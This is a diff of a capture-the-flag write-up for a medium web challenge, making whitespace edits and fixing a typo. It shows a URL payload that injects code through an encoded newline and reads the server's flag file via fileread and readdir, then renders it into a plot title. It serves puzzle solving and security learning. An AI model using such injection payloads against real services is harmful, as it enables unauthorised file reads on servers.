@@ -4,8 +4,8 @@ Category: web
 Difficulty: medium  
 
 ### Solution
-Enter the URL `https://ohio-instruments-84.chall.pwnoh.io/x)%0Atitle(fileread(char(readdir(char(46))(8)))`
-You receive the flag as an image, wherever you see a subscript then some character c, it appears as _c in the flag
+Enter the URL `https://ohio-instruments-84.chall.pwnoh.io/x)%0Atitle(fileread(char(readdir(char(46))(8)))`  
+You receive the flag as an image, wherever you see a subscript then some character c, it appears as _c in the flag  
 ![Response of the API request](result.png)
 
 ### Explanation
@@ -43,4 +43,4 @@ So we plot a line, and run `title(fileread(char(readdir(char(46))(8))))`
 `char("flag.txt")` casts a cell type to a string  
 `fileread("flag.txt")` reads the content of the flag `"bctf{the_flag_contents}"`  
 `title("bctf{the_flag_contents}")` writes the flag to the plot  
-Then it is sent to use with the flag!  
+Then it is sent to us with the flag!  
